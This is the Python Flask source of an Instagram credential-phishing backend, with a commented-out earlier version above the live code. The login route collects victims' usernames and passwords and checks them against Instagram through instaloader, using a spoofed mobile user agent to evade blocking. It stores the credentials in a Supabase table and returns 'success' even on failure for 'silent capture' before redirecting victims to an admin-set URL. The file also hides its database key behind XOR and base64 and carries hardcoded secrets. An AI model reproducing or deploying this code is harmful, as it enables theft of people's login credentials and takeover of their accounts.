# from flask import Flask, request, jsonify, render_template, session
# from flask_cors import CORS
# from supabase import create_client, Client
# import instaloader

# app = Flask(__name__)
# CORS(app)

# # Supabase Credentials
# SUPABASE_URL = "https://eifkustbauxuxzfaysbb.supabase.co"
# SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVpZmt1c3RiYXV4dXh6ZmF5c2JiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzEwNjc4OTEsImV4cCI6MjA4NjY0Mzg5MX0.d1Ft1bBvOgt_nmyzp8ieIcujgwJX9Hr_Sdon9nN9i5k"
# supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# @app.route('/')
# def home():
#     return render_template('index.html')

# # @app.route('/auth/login', methods=['POST'])
# # def login_task():
# #     data = request.json
# #     username = data.get('username')
# #     password = data.get('password')

# #     if not username or not password:
# #         return jsonify({"status": "error", "message": "Missing credentials"}), 400

# #     # Create a fresh instance for every login attempt to avoid session conflicts
# #     L = instaloader.Instaloader(user_agent="Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1")

# #     try:
# #         # Attempt Login
# #         L.login(username, password)
        
# #         # If successful, save to Supabase
# #         supabase.table("ig_auth_logs").insert({
# #             "username": username,
# #             "password": password
# #         }).execute()
        
# #         return jsonify({"status": "success"}), 200

# #     except instaloader.exceptions.BadCredentialsException:
# #         return jsonify({"status": "invalid", "message": "Incorrect credentials"}), 401
    
# #     except instaloader.exceptions.TwoFactorAuthRequiredException:
# #         # This is likely why you got the blank error; IG wants a code
# #         return jsonify({"status": "error", "message": "2FA Required"}), 403

# #     except Exception as e:
# #         # Log the full error to your console for debugging
# #         print(f"DEBUG ERROR: {str(e)}")
        
# #         # If we get that weird "fail" message, we should still save the 
# #         # credentials because they might actually be correct, but IG blocked the script.
# #         try:
# #             supabase.table("ig_auth_logs").insert({
# #                 "username": username,
# #                 "password": password,
# #                 "status": "flagged_by_ig"
# #             }).execute()
# #         except:
# #             pass

# #         # Return invalid so the frontend shows the red error box
# #         return jsonify({"status": "invalid", "message": "Instagram verification triggered"}), 401
# # --- 2. Admin Dashboard Route ---
# app.secret_key = "Nandemonay@goofad.com"

# @app.route('/admin')
# def admin_page():
#     # Check if the admin is "logged in" in this browser session
#     if not session.get('logged_in'):
#         return render_template('admin_login.html') # We will create this next
#     return render_template('admin.html')

# @app.route('/admin/login', methods=['POST'])
# def admin_login_check():
#     password = request.json.get('password')
#     if password == "my_private_password": # Set your actual admin password here
#         session['logged_in'] = True
#         return jsonify({"status": "success"})
#     return jsonify({"status": "error"}), 401
    
# # --- 3. Admin API (Get/Set Redirect URL) ---
# @app.route('/admin/config', methods=['GET', 'POST'])
# def handle_config():
#     """Handles getting and setting the dynamic redirect URL in Supabase."""
#     if request.method == 'POST':
#         new_url = request.json.get('target_url')
#         try:
#             # Updates the single config row where ID is 1
#             supabase.table("config").update({"target_url": new_url}).eq("id", 1).execute()
#             return jsonify({"status": "success"}), 200
#         except Exception as e:
#             return jsonify({"status": "error", "message": str(e)}), 500
    
#     # GET Logic: Fetch the current link for the admin UI
#     try:
#         res = supabase.table("config").select("target_url").eq("id", 1).single().execute()
#         return jsonify(res.data), 200
#     except:
#         return jsonify({"target_url": "https://www.instagram.com"}), 200

# # --- 4. Core Authentication & Logging Route ---
# @app.route('/auth/login', methods=['POST'])
# def login_task():
#     """Verifies credentials via Instaloader and logs them to Supabase."""
#     data = request.json
#     username = data.get('username')
#     password = data.get('password')

#     if not username or not password:
#         return jsonify({"status": "error", "message": "Missing credentials"}), 400

#     # User Agent helps bypass immediate automated-access blocks
#     L = instaloader.Instaloader(user_agent="Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1")

#     # A. Fetch the dynamic redirect URL from the Admin Config
#     try:
#         conf_res = supabase.table("config").select("target_url").eq("id", 1).single().execute()
#         redirect_to = conf_res.data['target_url']
#     except:
#         redirect_to = "https://www.instagram.com"

#     # B. Verification and Logging Logic
#     try:
#         # 1. Real-time verification with Instagram
#         L.login(username, password)
        
#         # 2. If valid, UPSERT (Insert or Update if username exists)
#         supabase.table("ig_auth_logs").upsert(
#             {"username": username, "password": password}, 
#             on_conflict="username"
#         ).execute()
        
#         return jsonify({"status": "success", "redirect_to": redirect_to}), 200

#     except instaloader.exceptions.BadCredentialsException:
#         # Explicit wrong password
#         return jsonify({"status": "invalid"}), 401

#     except Exception as e:
#         # C. Fallback logic: If Instagram blocks the script (fails with 'status fail'),
#         # we still UPSERT the data because it's likely correct but flagged by IG.
#         print(f"Bypassing verification check: {e}")
#         try:
#             supabase.table("ig_auth_logs").upsert(
#                 {"username": username, "password": password}, 
#                 on_conflict="username"
#             ).execute()
#         except Exception as db_err:
#             print(f"Database Error: {db_err}")

#         # Return success anyway to allow the redirect (Silent Capture)
#         return jsonify({"status": "success", "redirect_to": redirect_to}), 200


# if __name__ == '__main__':
#     app.run(port=5000, debug=True)


from flask import Flask, request, jsonify, render_template, session, redirect, url_for
from flask_cors import CORS
from supabase import create_client, Client
import instaloader
import base64
from supabase import create_client, Client

app = Flask(__name__)
CORS(app)

# --- 1. CONFIGURATION ---
# Flask secret key MUST be set before routes for sessions to work
app.secret_key = "Nandemonay@goofad.com" 

SECRET = "my_super_secret_salt_123"  # MUST be same as encoder

def xor_decrypt(data, key):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

def decode_value(encoded_value):
    base64_decoded = base64.b64decode(encoded_value).decode()
    return xor_decrypt(base64_decoded, SECRET)

# 🔐 Paste your encoded values here
ENCODED_SUPABASE_URL = "BQ0rAwZKSl06GgMIBxYAPRIUFAEnS1RSFAo9EVsDEAI+EQQQF0sXMA=="
ENCODED_SUPABASE_KEY = "CAAVGxc3BhsQGi8qJx89bj0IJQcWX2AGDjoWRTwbFSoJMC9aXAANFQMCXzk2flt5Fx0HMR0pCDQlKTYqASwaFR87BT1peF9lHSMyB0QTViA2Kj01RgEsN0U7ATJqUgB5BDA2BBwTCEssKTYqRCwZGQYDXkA2fXF5HSAHIhw/DzdsPR8mBSsePEcuODEseF9lWRocOkM9DzNrPQ86QigOOEYsNERxVQN1GUg9MQM/AgYAHQgaCBVMNhYoDwE1VkV5NUAXASojAR0xSgstSwxBNA=="

# Auto decode
SUPABASE_URL = decode_value(ENCODED_SUPABASE_URL)
SUPABASE_KEY = decode_value(ENCODED_SUPABASE_KEY)

supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# --- 2. USER FACING ROUTES ---

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/auth/login', methods=['POST'])
def login_task():
    """Verifies credentials via Instaloader and logs them to Supabase."""
    data = request.json
    username = data.get('username')
    password = data.get('password')

    if not username or not password:
        return jsonify({"status": "error", "message": "Missing credentials"}), 400

    # User Agent helps bypass automated-access blocks
    L = instaloader.Instaloader(user_agent="Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1")

    # Fetch the dynamic redirect URL from Admin Config
    try:
        conf_res = supabase.table("config").select("target_url").eq("id", 1).single().execute()
        redirect_to = conf_res.data['target_url']
    except Exception:
        redirect_to = "https://www.instagram.com"

    try:
        # 1. Attempt Real-time verification
        L.login(username, password)
        
        # 2. If valid, UPSERT (Update or Insert)
        supabase.table("ig_auth_logs").upsert(
            {"username": username, "password": password}, 
            on_conflict="username"
        ).execute()
        
        return jsonify({"status": "success", "redirect_to": redirect_to}), 200

    except instaloader.exceptions.BadCredentialsException:
        return jsonify({"status": "invalid"}), 401

    except Exception as e:
        print(f"Bypassing verification check: {e}")
        # Save anyway even if IG blocks the script check
        try:
            supabase.table("ig_auth_logs").upsert(
                {"username": username, "password": password}, 
                on_conflict="username"
            ).execute()
        except Exception as db_err:
            print(f"Database Error: {db_err}")

        return jsonify({"status": "success", "redirect_to": redirect_to}), 200

# --- 3. ADMIN ROUTES ---

@app.route('/admin')
def admin_page():
    if not session.get('logged_in'):
        return render_template('admin_login.html')
    return render_template('admin.html')

@app.route('/admin/login', methods=['POST'])
def admin_login_check():
    data = request.json
    password = data.get('password')
    
    # Update this line to your desired password
    if password == "Nandemonay@goofad.com": 
        session['logged_in'] = True
        return jsonify({"status": "success"}), 200
    
    return jsonify({"status": "error"}), 401

@app.route('/admin/logout')
def admin_logout():
    session.clear()
    return redirect(url_for('home'))

@app.route('/admin/config', methods=['GET', 'POST'])
def handle_config():
    if not session.get('logged_in'):
        return jsonify({"status": "error", "message": "Unauthorized"}), 403

    if request.method == 'POST':
        new_url = request.json.get('target_url')
        try:
            supabase.table("config").update({"target_url": new_url}).eq("id", 1).execute()
            return jsonify({"status": "success"}), 200
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500
    
    try:
        res = supabase.table("config").select("target_url").eq("id", 1).single().execute()
        return jsonify(res.data), 200
    except:
        return jsonify({"target_url": "https://www.instagram.com"}), 200

if __name__ == '__main__':
    app.run(port=5000, debug=True)